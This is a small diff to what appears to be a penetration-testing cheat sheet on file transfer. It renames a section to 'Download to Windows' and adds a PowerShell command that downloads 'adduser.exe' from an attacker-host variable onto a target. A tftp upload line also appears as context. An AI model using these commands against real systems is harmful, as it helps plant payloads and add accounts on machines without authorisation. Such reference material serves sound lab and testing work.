@@ -59,7 +59,11 @@ tftp -i $ip put <filename>
 ```
 
 
-## Linux -> Windows
+## Download to Windows
+
+```powershell
+iwr -uri http://$hip/adduser.exe -Outfile adduser.exe
+```
 
 Download File (HTTP)
 ```powershell
